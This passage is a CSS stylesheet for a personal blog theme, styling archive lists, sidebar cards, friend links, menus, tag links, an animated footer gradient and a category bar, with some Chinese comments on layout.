var(--fyz-theme);\n}\n\n.article-sort-item:hover:not(.year){\n    background-color:var(--fyz-theme);\n    box-shadow: 0 0 10px var(--fyz-theme);\n}\n\n.article-sort-item:hover:not(.year) .article-sort-item:hover:not(.year) > i{\n    width:auto;\n    opacity:1;\n}\n\n.article-sort-item:hover:not(.year) .article-sort-item-img{\n    transition:0.5s;\n    width:0;\n}\n\n.article-sort-item:hover:not(.year) .article-sort-item-title{\n    color:white!important;\n}\n\n.article-sort-item:hover:not(.year) .article-sort-item-time{\n    color:var(--fyz-white)!important;\n}\n.article-sort-item-title{\n    white-space: nowrap;\n}\n.article-sort-item-info{\n    overflow: hidden;\n}\n.article-sort-item-img{\n    flex-shrink: 0;\n}\n@media screen and (max-width:768px){\n    .article-sort-item:not(.year){\n        width:100%!important;\n        min-width: 100%!important;\n    }\n}\n@media screen and (max-width:450px){\n    #tag .article-sort-item-img,#category .article-sort-item-img,#archive .article-sort-item-img{\n        display: none!important;\n    }\n}\n[data-theme='light'] #archive{\n    background-color: var(--fyz-white-acrylic1);\n    backdrop-filter: blur(30px) saturate(180%);\n    -webkit-backdrop-filter: blur(30px) saturate(180%);\n}\n#aside-content .aside-list>.aside-list-item {\n    padding: 8px;\n    padding-top: 6px!important;\n    padding-bottom: 6px!important;\n    border-radius: 12px;\n    transition: .3s;\n    margin: 4px 0;\n    cursor: pointer;\n}\n#aside-content .aside-list>.aside-list-item:hover {\n    background: var(--fyz-theme);\n    color: var(--heo-white)!important;\n    transition: .3s;\n    box-shadow: var(--fyz-theme);\n    scale:1.04\n}\n#aside-content .aside-list>.aside-list-item:hover .content *{\n    color: var(--heo-white)!important;\n}\n#aside-content\n.card-archives\nul.card-archive-list\n> .card-archive-list-item\na\nspan:first-child,\n#aside-content\n.card-categories\nul.card-category-list\n> .card-category-list-item\na\nspan:first-child {\n    width: auto;\n    min-width: 50%;\n}\nli.card-archive-list-item {\n    width: 100%;\n    flex: 0 0 48%;\n}\n#aside-content .card-archives ul.card-archive-list>.card-archive-list-item a, #aside-content .card-categories ul.card-category-list>.card-category-list-item a, .recent-posts .recent-post-item .recent-post-cover img.article-cover {\n    border-radius: 10px;\n}\n#aside-content .card-archives ul.card-archive-list>.card-archive-list-item a {\n    border-radius: 12px;\n    display: flex;\n    flex-direction: column;\n    align-content: space-between;\n    border: 1px solid #e3e8f7;\n    margin: 4px 0;\n}\n#aside-content .card-archives ul.card-archive-list>.card-archive-list-item a span, #aside-content .card-categories ul.card-category-list>.card-category-list-item a span, #aside-content .card-info .card-info-data>.card-info-data-item a .headline, #pagination .next_info, #pagination .prev_info, #sidebar #sidebar-menus .menus_items .site-page, #sidebar #sidebar-menus .site-data .data-item>a>div, .limit-one-line {\n    overflow: hidden;\n    -o-text-overflow: ellipsis;\n    text-overflow: ellipsis;\n    white-space: nowrap;\n}\n#aside-content .card-archives ul.card-archive-list>.card-archive-list-item a span, #aside-content .card-categories ul.card-category-list>.card-category-list-item a span, #aside-content .card-info .card-info-data>.card-info-data-item a .headline, #pagination .next_info, #pagination .prev_info, #sidebar #sidebar-menus .menus_items .site-page, #sidebar #sidebar-menus .site-data .data-item>a>div, .limit-one-line {\n    overflow: hidden;\n    -o-text-overflow: ellipsis;\n    text-overflow: ellipsis;\n    white-space: nowrap;\n}\nspan.card-archive-list-count {\n    width: auto;\n    text-align: left;\n    font-size: 1.2rem;\n    line-height: .9;\n    font-weight: 700;\n}\n#aside-content .card-archives ul.card-archive-list {\n    display: flex;\n    flex-direction: row;\n    justify-content: space-between;\n    flex-wrap: wrap;\n}\n.card-archive-list-link:hover{\n    padding-left:10px!important;\n    color:var(--fyz-white)!important;\n    scale:1.03;\n}\n.card-archive-list-link{\n    padding-bottom: 10px!important;\n}\n#aside-content .card-archives ul.card-archive-list > .card-archive-list-item a:hover{\n    background-color: var(--fyz-theme)!important;\n}\n#aside-content .card-categories ul.card-category-list > .card-category-list-item a:hover{\n    background-color: var(--fyz-theme)!important;\n    color: var(--fyz-white)!important;\n}\n#aside-content .card-tag-cloud a, .tag-cloud-list a{\n    filter: brightness(1.2);\n}\n#aside-content .card-tag-cloud a:hover, .tag-cloud-list a:hover{\n    color:var(--fyz-theme)!important;\n    scale:1.1;\n}\n#article-container .flink .flink-list > .flink-list-item a .flink-item-icon{\n    border-radius: 15px;\n}\n[data-theme=\"dark\"] .flink-item-icon img{\n    background-color: var(--fyz-white)!important;\n    margin: 0 auto!important;\n}\n#article-container .flink .flink-list > .flink-list-item{\n    width:calc(100% / 5 - 15px);\n}\n@media screen and (max-width: 1200px) {\n    #article-container .flink .flink-list > .flink-list-item{\n        width:calc(100% / 4 - 15px);\n    }\n}\n@media screen and (max-width: 1024px) {\n    #article-container .flink .flink-list > .flink-list-item{\n        width:calc(100% / 3 - 15px);\n    }\n}\n@media screen and (max-width: 768px) {\n    #article-container .flink .flink-list > .flink-list-item{\n        width:calc(100% / 2 - 15px);\n    }\n}\n@media screen and (max-width: 512px) {\n    #article-container .flink .flink-list > .flink-list-item{\n        width:calc(100% - 15px);\n    }\n}\n#article-container .flink .flink-list > .flink-list-item{\n    margin: 6px 6px;\n    transition: background-color .3s!important;\n    -webkit-transition: background-color .3s!important;\n    -moz-transition: background-color .3s!important;\n    -ms-transition: background-color .3s!important;\n    -o-transition: background-color .3s!important;\n    transition: .3s;\n    border-radius: 12px;\n    transition-timing-function: ease-in-out;\n    border: var(--style-border-always);\n    box-shadow: var(--heo-shadow-border);\n    background: var(--heo-card-bg);\n}\n[data-theme=\"dark\"] .flink-item-name,[data-theme=\"dark\"] .flink-item-desc{\n    color:var(--fyz-white)!important;\n}\n[data-theme=\"light\"] .flink-item-name,[data-theme=\"light\"] .flink-item-desc{\n    color:var(--fyz-black)!important;\n}\n#article-container .flink .flink-list > .flink-list-item:hover div{\n    color: var(--fyz-white)!important;\n}\n#article-container .flink .flink-item-name{\n    padding: 16px 10px 0 0px;\n    text-align: left;\n    font-size: 1.2em;\n}\n#article-container .flink .flink-list>.flink-list-item:hover .flink-item-icon{\n    width: 20px;\n    transition-timing-function: ease-in-out;\n}\n#article-container .flink .flink-list>.flink-list-item:hover a .flink-item-icon img {\n    transition: .6s;\n    width: 0;\n    opacity: 0;\n    min-width: 0;\n    min-height: 0;\n    margin: 3rem;\n}\n#article-container .flink .flink-item-desc{\n    white-space: normal;\n    padding: 5px 10px 16px 0px;\n    color: white;\n    text-align: left;\n    height: 40px;\n    text-overflow: ellipsis;\n    opacity: .7;\n    display: -webkit-box;\n    overflow: hidden;\n    -webkit-box-orient: vertical;\n    -webkit-line-clamp: 2;\n    font-size: 0.9em;\n}\npre{\n    border-radius: 12px;\n    background: #f5f2f0;\n    padding: 1em;\n    margin: 0.5em 0;\n    overflow: auto;\n    color: #000;\n    text-shadow: 0 1px #fff;\n    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;\n    font-size: 1em;\n    text-align: left;\n    white-space: pre;\n    word-spacing: normal;\n    word-break: normal;\n    word-wrap: normal;\n    line-height: 1.5;\n    -moz-tab-size: 4;\n    tab-size: 4;\n    -webkit-hyphens: none;\n    -moz-hyphens: none;\n    -ms-hyphens: none;\n    hyphens: none;\n}\n#post #article-container a:not(.post-meta__tags):not(img):not(.tag-Link):not(a[data-fancybox]):not(.markdownIt-Anchor):hover,#page #article-container a:not(.post-meta__tags):not(.headerlink):not(img):not(.flink-list-item>a):not(.random-post-start):not(.tag-Link):not(a[data-fancybox]):not(#cf-container a):not(.markdownIt-Anchor):not(.btn-beautify):hover,.post-copyright a:hover,.card-announcement a:hover,.card-history a:hover,.tk-content a:not(.tk-content a[data-fancybox=\"gallery\"]):hover{\n    border-radius: 6px;\n    background-color: var(--fyz-theme);\n    text-decoration: none!important;\n    color:var(--fyz-white)!important;\n    border:none;\n    box-shadow: #dadada 0 0 8px 2px;\n    -webkit-border-radius: 6px;\n    -moz-border-radius: 6px;\n    -ms-border-radius: 6px;\n    -o-border-radius: 6px;\n}\n#post #article-container a:not(.post-meta__tags):not(.headerlink):not(.tag-Link):not(a[data-fancybox]):not(.markdownIt-Anchor),#page #article-container a:not(.post-meta__tags):not(.headerlink):not(img):not(.flink-list-item>a):not(.tag-Link):not(a[data-fancybox]):not(#cf-container a):not(.markdownIt-Anchor):not(.btn-beautify),.post-copyright a,.card-announcement a,.card-history a,.tk-content a:not(.tk-content a[data-fancybox=\"gallery\"]){\n    border-bottom: 2px solid var(--fyz-theme);\n    color:var(--font-color);\n    padding:4px;\n}\ncode {\n    word-break: break-all;\n}\n#recent-posts>.recent-post-item:hover{\n    border: 1px solid var(--fyz-theme)!important;\n    box-shadow:0 0 3px var(--fyz-theme)!important;\n}\n.recent-post-item:hover{\n    border: 1px solid var(--fyz-theme);\n    box-shadow:0 0 3px var(--fyz-theme)!important;   \n}\n[data-theme='light'] #recent-posts>.recent-post-item{\n    background-color: var(--fyz-white-acrylic1);\n    backdrop-filter: blur(30px) saturate(180%);\n    -webkit-backdrop-filter: blur(30px) saturate(180%);\n    border: 1px solid var(--fyz-border);\n}\n[data-theme='dark'] #recent-posts>.recent-post-item{\n    border: 1px solid var(--fyz-border);\n}\n#recent-posts>.recent-post-item>.recent-post-info>.content{\n    display:-webkit-box!important;\n}\n.layout {\n    max-width: 1500px;\n}\n.aside-content {\n    max-width: 300px;\n    min-width: 300px;\n    position: relative;\n    right: 0;\n    width: 100%;\n}\n@media screen and (min-width: 901px) {\n    #post {\n        width: calc(100% - 300px) !important;\n    }\n    #recent-posts {\n        width: calc(100% - 300px) !important;\n    }\n    #blog-info,#nav-right{\n        max-width: 33.33%;\n    }\n}\n@media screen and (max-width: 900px) {\n\n    .card-widget:not(#card-toc) {\n        display: none;\n    }\n    #waifu {\n        display: none;\n    }\n    [data-theme='dark'] #card-toc {\n        background: var(--fyz-black);\n    }\n}\n#aside-content #card-toc .toc-content .toc-link.active {\n    background: var(--fyz-theme)!important;\n    color: #fff;\n    border-radius: 15px;\n}\n#pagination .page-number.current {\n    background: var(--fyz-theme)!important;\n}\n#universe-background{\n    display: block;\n    position: fixed;\n    margin: 0;\n    padding: 0;\n    border: 0;\n    outline: 0;\n    left: 0;\n    top: 0;\n    width: 100%;\n    height: 100%;\n    pointer-events: none;\n    z-index: 1;\n}\n#nav-right{\n    flex:1 1 auto;\n    justify-content: flex-end;\n    margin-left: auto;\n    display: flex;\n    flex-wrap:nowrap;\n}\n#nav *:not(.site-name)::after{\n    background-color: transparent!important;\n}\n.category-lists ul li:before{\n    display: none;\n}\n.page #category .category-list-bar .lists .category-list .category-list-item,\n#tag .tag-list-bar .lists ul a{\n    padding: 0 0.4rem;\n    margin: 0 0.4rem;\n    height: 1.5rem;\n    line-height: 1rem;\n    border-radius: 0.4rem;\n    transition: 0.2s;\n    list-style: none;\n    margin-top: 1.2rem!important;\n}\n[data-theme='light'] .category-list-link{\n    color: var(--fyz-black);\n    padding: 5px!important;\n    border-radius: 8px;\n    -webkit-border-radius: 8px;\n    -moz-border-radius: 8px;\n    -ms-border-radius: 8px;\n    -o-border-radius: 8px;\n}\n[data-theme='dark'] .category-list-link{\n    color: var(--fyz-white);\n    padding: 5px!important;\n    border-radius: 8px;\n    -webkit-border-radius: 8px;\n    -moz-border-radius: 8px;\n    -ms-border-radius: 8px;\n    -o-border-radius: 8px;\n}\n.category-list-link:hover{\n    color: var(--fyz-white)!important;\n    background-color: var(--fyz-theme);\n    box-shadow:0 0 3px var(--fyz-theme)!important;\n    padding: 5px;\n}\n.category-list-item:not(.category-list-bar .category-list-item) {\n    font-size: 30px;\n}\n.category-lists ul li {\n    position: relative;\n    margin: 6px 0;\n    padding: 0.12em 0.4em 0.12em 1.4em;\n}\n.category-list {\n    display: flex;\n    flex-wrap: wrap;\n}\n#post .post-copyright .post-copyright-info a {\n    text-decoration: none;\n}\n.recent-posts .recent-post-item .recent-post-cover img.article-cover {\n    border-radius: 10px;\n}\n#recent-posts > .recent-post-item >.recent-post-info > .article-title:hover{\n    color:var(--fyz-theme)!important\n}\n#recent-posts>.recent-post-item:not(#recent-posts>.recent-post-item:has(.post_cover)) >.recent-post-info{\n    width: 100%!important;\n}\n#recent-posts>.recent-post-item:not(#recent-posts>.recent-post-item:has(.post_cover)) >.recent-post-info>.content{\n    -webkit-line-clamp: 4!important;\n}\n@media screen and (min-width: 1200px) {\n    #recent-posts{\n        margin-top:-1rem;  /*头部为空时抵消间隔，若有磁贴或日历请注释掉该行*/\n        align-content:flex-start;\n        display: flex;\n        flex-wrap: wrap; /*规定灵活的项目在必要的时候拆行或拆列。*/\n        justify-content: space-between; /*。*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) {\n      /*max-height:324px;*/  /*文章容器最大高度*/\n      margin-top: 1rem; /*最小间距*/\n      display: inline-block;\n      height:auto; /*高度自动*/\n      width:49%;/*文章容器容器宽度*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) .post_cover {\n      width: 100%; /*图片封面宽度*/\n        height: 200px;/*图片封面高度*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) .post_cover img.post_bg {\n      width: 100%;/*图片宽度*/\n      height: 100%;/*图片高度*/\n    }\n    \n    \n    #recent-posts > .recent-post-item:not(.latest) >.recent-post-info > .content {\n    display:none;/*隐藏文章详情*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) {\n    \n      -webkit-flex-direction: column; /*容器内部纵向排列*/\n      -ms-flex-direction: column; /*容器内部纵向排列*/\n      flex-direction: column; /*容器内部纵向排列*/\n    \n    }\n    #recent-posts > .recent-post-item:not(.latest) .left_radius {\n        border-radius: 12px 8px 0 0;/*圆角修改*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) .right_radius {\n        border-radius: 12px 8px 0 0;/*圆角修改*/\n    }\n    .recent-post-item:not(.latest){\n        height:auto !important;/*容器高度自动*/\n    }\n    \n    .recent-post-info {\n      \n      padding: 0 40px;/*容器内部文字左右间距*/\n      margin-top: 1em;/*容器内部文字上间距*/\n      width: 100%!important;/*容器宽度*/\n    }\n    #recent-posts > .recent-post-item:not(.latest) > .recent-post-info > .article-title {\n        -webkit-line-clamp: 1;/*控制标题的行数*/\n        margin-top: 0.3rem; /*控制标题的上间距*/\n        margin-bottom: 0.3rem;/*控制标题的下间距*/\n        /* color: var(--text-highlight-color); */\n        font-size: 1.2em; /*控制标题的字体大小*/\n        line-height: 1.4;/*控制标题的行高*/\n     \n    }\n    #recent-posts > .recent-post-item:not(.latest) > .recent-post-info > .article-title :hover{\n        color:var(--fyz-theme)\n     \n    }\n    #recent-posts > .recent-post-item:not(.latest) >.recent-post-info > .article-meta-wrap {\n        margin-bottom: 1rem;/*控制标题meta信息的底部间距*/\n    }\n}\nblockquote {\n    border: 1px solid var(--fyz-border);\n    border-radius: 12px;\n    background-color: var(--fyz-gray);\n    padding: 10px;\n}\nblockquote p:first-child{\n    margin-top:0;\n}\n[data-theme=\"dark\"] blockquote{\n    background-color: black!important;\n}\n.page:not(.page.home) #page {\n    width: 100%;\n}\n.page #archive {\n    width: 100%!important;\n}\n#archive, #tag, #category {\n    padding: 25px 10px;\n}\n[data-theme=\"dark\"] .history_slide_time {\n    color: var(--fyz-white)!important;\n    font-weight: bold!important;\n}\n[data-theme=\"light\"] .history_slide_time {\n    color: var(--fyz-black)!important;\n    font-weight: bold!important;\n}\n.layout.hide-aside {\n    max-width: 1400px;\n}\n.snackbar-container{\n    border-radius: 12px!important;\n    background-color: #000000aa!important;\n}\n.snackbar-container .action{\n    color:var(--fyz-theme)!important;\n    background-color: transparent!important;\n}\n.snackbar-container{\n    font-family: var(--global-font),'PingFang SC','Ubuntu Mono','Noto Sans','Microsoft Yahei','SimSun'!important;\n    backdrop-filter: blur(10px);\n    -webkit-backdrop-filter: blur(10px);\n}\n#menus {\n    margin: 0 auto;\n}\n#menus,#sidebar-menus{\n    font-weight: bolder;\n}\n.menus_item_child:hover {\n    outline: solid 1px var(--fyz-theme);\n}\n.menus_items:not(#sidebar-menus>.menus_items){\n    display: flex;\n    /* justify-content: center !important; */\n    /* flex:auto; */\n}\n.menus_item_child:not(#sidebar-menus>.menus_items>.menus_item>.menus_item_child)>li{\n    width: auto;\n    display:inline;\n}\n.menus_item_child:not(#sidebar-menus>.menus_items>.menus_item>.menus_item_child){\n    right:auto!important;\n}\n.menus_item_child li:not(#sidebar-menus li){\n    float: left;\n    margin: 3px;\n    border-radius: 6px!important;\n    -webkit-border-radius: 6px!important;\n    -moz-border-radius: 6px!important;\n    -ms-border-radius: 6px!important;\n    -o-border-radius: 6px!important;\n}\n.menus_item_child:not(#sidebar-menus>.menus_items>.menus_item>.menus_item_child){\n    padding-bottom: 2px!important;\n}\n.menus_item_child:not(#sidebar-menus>.menus_items>.menus_item>.menus_item_child)::before{\n    transform: translateY(-20px);\n    margin-top:20px;\n}\n.menus_item_child:not(#sidebar-menus>.menus_items>.menus_item>.menus_item_child){\n    left:50%;\n    translate:-50%;\n}\n#sidebar-menus hr{\n    display: none;\n}\n#sidebar-menus{\n    padding-top: 60px;\n}\n#sidebar #sidebar-menus .menus_items .site-page:hover{\n    background:var(--fyz-theme);\n}\n@media screen and (max-width: 955px){\n    .menus_items:not(#sidebar-menus .menus_items),#name-container{\n        display:none!important;\n    }\n    #sidebar #sidebar-menus .menus_items .site-page {\n        padding: 6px 30px 6px 22px !important;\n        border-radius: 10px!important;\n    }\n    #nav #toggle-menu{\n        display: inline-block!important;\n    }\n    #sidebar #sidebar-menus .menus_items .site-page{\n        padding: 6px 30px 6px 22px!important;\n    }\n    #sidebar #sidebar-menus .menus_items .site-page.group .menus_item_child li a{\n        border-radius: 10px!important;\n    }\n    #sidebar #sidebar-menus .menus_items .site-page.group + .menus_item_child{\n        display: none;\n    }\n    #sidebar #sidebar-menus .menus_items .site-page.group.hide + .menus_item_child{\n        display: block;\n    }\n}\n.menus_item_child li{\n    border-radius: 10px!important;\n}\n.menus_item_child li:hover{\n    background: var(--fyz-theme)!important;\n}\n.menus_item_child li:hover a{\n    color: var(--fyz-white)!important;\n}\n#sidebar-menus .menus_item_child {\n    -webkit-animation: sub_menus 0.3s 0.1s ease both;\n    -moz-animation: sub_menus 0.3s 0.1s ease both;\n    -o-animation: sub_menus 0.3s 0.1s ease both;\n    -ms-animation: sub_menus 0.3s 0.1s ease both;\n    animation: sub_menus 0.3s 0.1s ease both;\n}\n#sidebar #sidebar-menus .menus_items .site-page:hover {\n    color: var(--fyz-white);\n}\n.menus_item:not(#sidebar-menus .menus_item) .site-page:not(.child){\n    margin: 0 auto;\n    padding: 10px;\n    border-radius: 10px;\n}\n.menus_item:not(#sidebar-menus .menus_item) .site-page:not(.child):hover{\n    background: var(--fyz-theme);\n}\n[data-theme='light'] .menus_item_child{\n    border: 1px solid var(--fyz-border);\n    margin:5px!important;\n    border-radius: 10px;\n    padding: 20px;\n    width: 100%;\n    background-color: var(--fyz-white)!important;\n}\n[data-theme='dark'] .menus_item_child {\n    border: 1px solid var(--fyz-border);\n    margin: 5px !important;\n    border-radius: 10px;\n    padding: 20px;\n    width: 100%;\n    background-color: var(--fyz-black) !important;\n}\n\n#page-header.nav-fixed #nav a:hover, #page-header.nav-fixed #nav span.site-page:hover, #page-header.nav-fixed #nav #toggle-menu:hover{\n    color: var(--fyz-white)!important;\n}\n#nav .menus_items .menus_item .menus_item_child li:hover a{\n    color: var(--fyz-white)!important;\n}\n#nav #search-button {\n    padding: 0;\n}\n#blog-info {\n    min-width: fit-content;\n}\n.card-widget {\n    border: 1px solid var(--fyz-border);\n}\n.card-widget:hover {\n    border: 1px solid var(--fyz-theme) !important;\n    box-shadow: 0 0 3px var(--fyz-theme) !important;\n}\n.toggle > .toggle-button {\n    padding: 6px 15px;\n    background: #f0f0f0;\n    color: #1f2d3d;\n    border-radius: 12px;\n}\n[data-theme=\"dark\"] .toggle-button {\n    background-color: var(--fyz-black);\n    color: var(--fyz-white);\n}\n[data-theme=\"dark\"] details:not(.card-tags details) {\n    border-radius: 12px;\n    background-color: #0006;\n}\n[data-theme=\"light\"] details:not(.card-tags details) {\n    border-radius: 12px;\n    background-color: #FFFFFF88;\n}\n[data-theme=\"dark\"] details > summary {\n    filter: brightness(1.0);\n}\n#post .post-copyright:hover{\n    border: 1px solid var(--fyz-theme);\n    box-shadow: 0 0 3px var(--fyz-theme);\n}\n.welcome span{\n    font-weight: bolder;\n    color: var(--fyz-theme);\n}\n.site-name{\n    font-size: 26px;\n    position: relative;\n    display: block;\n    width: fit-content;\n    padding: 8px;\n}\n.site-name:hover::after {\n    opacity: 1;\n    scale: 1.01;\n}\n.site-name::after{\n    opacity: 0;\n    background-color: var(--fyz-theme)!important;\n    border-radius: 12px;\n    -webkit-border-radius: 12px;\n    -moz-border-radius: 12px;\n    -ms-border-radius: 12px;\n    -o-border-radius: 12px;\n    transition: .3s;\n    -webkit-transition: .3s;\n    -moz-transition: .3s;\n    -ms-transition: .3s;\n    -o-transition: .3s;\n    position: absolute;\n    left: 0;\n    width: 100%;\n    content: \"\\f015\";\n    box-shadow: 0 0 5px var(--fyz-theme);\n    font-family: \"Font Awesome 6 Free\";\n    text-align: center;\n    color: white;\n}\n#article-container .btn-beautify.outline{\n    border-radius: 30px;\n}\n@-webkit-keyframes Gradient {\n    0% {\n        background-position: 0 50%;\n    }\n\n    50% {\n        background-position: 100% 50%;\n    }\n\n    100% {\n        background-position: 0 50%;\n    }\n}\n@-moz-keyframes Gradient {\n    0% {\n        background-position: 0 50%;\n    }\n\n    50% {\n        background-position: 100% 50%;\n    }\n\n    100% {\n        background-position: 0 50%;\n    }\n}\n\n@keyframes Gradient {\n    0% {\n        background-position: 0 50%;\n    }\n\n    50% {\n        background-position: 100% 50%;\n    }\n\n    100% {\n        background-position: 0 50%;\n    }\n}\n#footer{\n    background: linear-gradient(-45deg,#ee7752,#ce3e75,#23a6d5,#23d5ab);\n    background-size: 400% 400%;\n    -webkit-animation: Gradient 10s ease infinite;\n    -moz-animation: Gradient 10s ease infinite;\n    animation: Gradient 10s ease infinite;\n    border-top-left-radius: 10px;\n    border-top-right-radius: 10px;\n}\n[data-theme='dark'] #footer:before{\n    position: absolute;\n    width: 100%;\n    height: 100%;\n    background-color: rgba(0, 0, 0, 0.7);\n    content: '';\n}\n#article-container .tag-Link {\n    background: var(--heo-background);\n    border-radius: 8px!important;\n    display: flex;\n    border: var(--style-border);\n    flex-direction: column;\n    padding: 0.5rem 1rem;\n    border-width: 1px!important;\n    margin: 1rem;\n    text-decoration: none!important;\n    color: var(--heo-fontcolor);\n}\n\n#article-container .tag-Link:hover {\n    border: var(--style-border-hover);\n}\n\n#article-container .tag-Link .tag-link-tips {\n    border-bottom: 1px solid var(--heo-gray);\n    padding-bottom: 4px;\n    font-size: 0.8rem;\n    font-weight: normal;\n}\n#article-container .tag-Link .tag-link-bottom {\n    display: flex;\n    margin-top: 0.5rem;\n    align-items: center;\n    justify-content: space-around;\n}\n#article-container .tag-Link .tag-link-bottom .tag-link-left {\n    width: 60px;\n    min-width: 60px;\n    height: 60px;\n    background-size: cover;\n}\n#article-container .tag-Link .tag-link-left img{\n    width: 100%;\n    height: 100%;\n    object-fit: cover;\n}\n[data-theme='dark'] #article-container .tag-Link .tag-link-left img{\n    background: var(--heo-white);\n}\n[data-theme='light'] #article-container .tag-Link .tag-link-left img{\n    background: var(--heo-gray);\n}\n\n#article-container .tag-Link .tag-link-bottom .tag-link-right {\n    margin-left: 1rem;\n}\n\n#article-container .tag-Link .tag-link-bottom .tag-link-right .tag-link-title {\n    font-size: 1rem;\n    line-height: 1.2;\n}\n\n#article-container .tag-Link .tag-link-bottom .tag-link-right .tag-link-sitename {\n    font-weight: normal;\n    margin-top: 4px;\n    font-size: 0.9rem;\n}\n\n#article-container .tag-Link .tag-link-bottom i {\n    margin-left: auto;\n}\n.tag-Link .tag-link-bottom .tag-link-left{\n    background: var(--heo-card-bg);\n    border-radius: 10px;\n}\n.tag-Link .tag-link-bottom .tag-link-left i {\n    position: relative;\n    padding: 0;\n    margin: auto;\n    font-size: 24px;\n    left: 25%;\n    top: 25%;\n}\n.tag-Link:hover{\n    text-decoration: none;\n}\n#article-container a[data-fancybox=\"gallery\"] img {\n    border-radius: 12px;\n    cursor: zoom-in;\n}\n@media screen and (max-width:900px){\n    .gc{\n        width: 100%!important;\n        margin-right: 0!important;\n        margin-bottom: 10px;\n    }\n    .cards{\n        flex-wrap: wrap;\n    }\n    .fl{\n        width: 100%!important;\n    }\n}\n@media screen and (max-width:768px) {\n    .gc{\n        display: none!important;\n    }\n}\n@media screen and (min-width: 1050px) {\n    #random-top2 {\n        display: none;\n    }\n}\n[data-theme='light'] #random-top2 {\n    color: var(--fyz-black);\n    font-size: 18px;\n    border: 1px solid var(--fyz-border);\n    backdrop-filter: blur(30px) saturate(180%);\n    -webkit-backdrop-filter: blur(30px) saturate(180%);\n    background-color: var(--fyz-white-acrylic1) !important;\n    border-radius: 12px;\n    padding: 10px;\n}\n[data-theme='dark'] #random-top2 {\n    color: var(--fyz-white);\n    font-size: 18px;\n    border: 1px solid var(--fyz-border);\n    backdrop-filter: blur(30px) saturate(180%);\n    -webkit-backdrop-filter: blur(30px) saturate(180%);\n    border-radius: 12px;\n    background-color: var(--fyz-black-acrylic2) !important;\n    padding: 10px;\n    flex-flow: column;\n}\n#random-top2:hover{\n    border: 1px solid var(--fyz-theme);\n    box-shadow: 0 0 3px var(--fyz-theme) !important;\n    background-color: var(--fyz-theme) !important;\n    color: var(--fyz-white);\n}\n.cards{\n    width: 100%;\n    display: flex;\n}\n.cards .github_container,.cards #random-top,.cards #swiper-container{\n    border-radius: 8px;\n    border: 1px solid var(--fyz-border);\n}\n.cards .github_container:hover,.cards #random-top:hover,#random-top2:hover,.cards #swiper-container:hover{\n    border: 1px solid var(--fyz-theme) !important;\n    box-shadow: 0 0 3px var(--fyz-theme) !important;\n}\n.top{\n    display: flex;\n    flex-flow: column;\n    flex-wrap: wrap;\n    margin-left: auto;\n    margin-right: auto;\n    max-width: 100%;\n    padding: 15px;\n}\n.cards #random-top{\n    width:40%;\n    background-color: var(--fyz-white-acrylic1)!important;\n    border-radius: 8px;\n    margin-right: 10px !important;\n    background-size:cover;\n    color:var(--fyz-white);\n    font-size:44px;\n    position: relative;\n    margin: 10px 0;\n    height: 250px;\n}\n.cards #swiper-container{\n    width:60%;\n    position: relative;\n    margin: 10px 0;\n    height: 250px;\n    border: 1px solid var(--fyz-border);\n    display: flex;\n    border-radius: 8px;\n}\n.cards #swiper-container .recent-post-item{\n    border-radius: 8px;\n    border: unset;\n}\n.gc{\n    width: 50%;\n    margin-right: 10px;\n    display: flex;\n    height: 300px;\n}\n.fl{\n    width: 50%;\n    border: 1px solid var(--fyz-border);\n    display: flex;\n    border-radius: 8px;\n    height: 300px;\n}\n.fl:hover{\n    border: 1px solid var(--fyz-theme) !important;\n    box-shadow: 0 0 3px var(--fyz-theme) !important;\n}\n@media screen and (max-width: 1050px) {\n    #random-top{\n        display: none !important;\n    }\n    #swiper-container{\n        width: 100%!important;\n    }\n}\n#random-banner{\n    width:100%!important;\n    height:100%!important;\n    border-radius:8px;\n}\n#random-hover{\n    position:absolute;\n    right:0%;\n    height:100%!important;\n    color:var(--fyz-theme);\n    border-radius: 8px;\n    opacity: 0;\n    transform-style: preserve-3d;\n    transition: .3s;\n}\n#random-hover:hover{\n   color:#ffffff;\n   background-color: #425aefdd;\n   backdrop-filter: blur(10px) saturate(180%);\n   -webkit-backdrop-filter: blur(10px) saturate(180%);\n}\n#random-top:hover #random-hover{\n    opacity: 1;\n    -ms-filter: none;\n    filter: none;\n    padding-left: 2rem;\n    backdrop-filter: blur(15px);\n    -webkit-backdrop-filter: blur(15px);\n    -webkit-transform: translateZ(0);\n    -moz-transform: translateZ(0);\n    -o-transform: translateZ(0);\n    -ms-transform: translateZ(0);\n    transform: translateZ(0);\n    -webkit-backface-visibility: hidden;\n    -moz-backface-visibility: hidden;\n    -ms-backface-visibility: hidden;\n    backface-visibility: hidden;\n    -webkit-transform-style: preserve-3d;\n    -moz-transform-style: preserve-3d;\n    -o-transform-style: preserve-3d;\n    -ms-transform-style: preserve-3d;\n    transform-style: preserve-3d;\n    -webkit-transition: .3s;\n    -moz-transition: .3s;\n    -o-transition: .3s;\n    -ms-transition: .3s;\n    transition: .3s;\n    background-size: 200%;\n    cursor: pointer\n}\n#categoryBar{\n    width: 100%!important;\n    overflow: auto;\n    overflow: -moz-scrollbars-none;\n    scrollbar-width: none !important;\n}\n#categoryBar .category-list{\n    scrollbar-width: none !important;\n}\n#categoryBar::-webkit-scrollbar{\n    width: 0 !important\n}\n#categoryBar li.category-list-item{\n    height:115px!important;\n}\n#categoryBar .category-list-count::after{\n    right: -200% !important;\n}\n#categoryBar ul.category-list{\n    margin: 5px 5px 0 5px !important;\n    padding: 0 !important;\n}\n#categoryBar li.category-list-item {\n    font-weight: bold;\n    display: inline-block;\n    height: 130px !important;\n    margin: 5px 0.5% 10px 0.5% !important;\n    background-image: -webkit-linear-gradient(rgba(0,0,0,0.4) 25%, rgba(16,16,16,0) 100%);\n    background-image: -moz-linear-gradient(rgba(0,0,0,0.4) 25%, rgba(16,16,16,0) 100%);\n    background-image: -o-linear-gradient(rgba(0,0,0,0.4) 25%, rgba(16,16,16,0) 100%);\n    background-image: -ms-linear-gradient(rgba(0,0,0,0.4) 25%, rgba(16,16,16,0) 100%);\n    background-image: linear-gradient(rgba(0,0,0,0.4) 25%, rgba(16,16,16,0) 100%);\n    border-radius: 10px;\n    -webkit-box-shadow: rgba(50,50,50,0.3) 50px 50px 50px 50px inset;\n    box-shadow: rgba(50,50,50,0.3) 50px 50px 50px 50px inset;\n    overflow: hidden;\n    background-size: 100% !important;\n    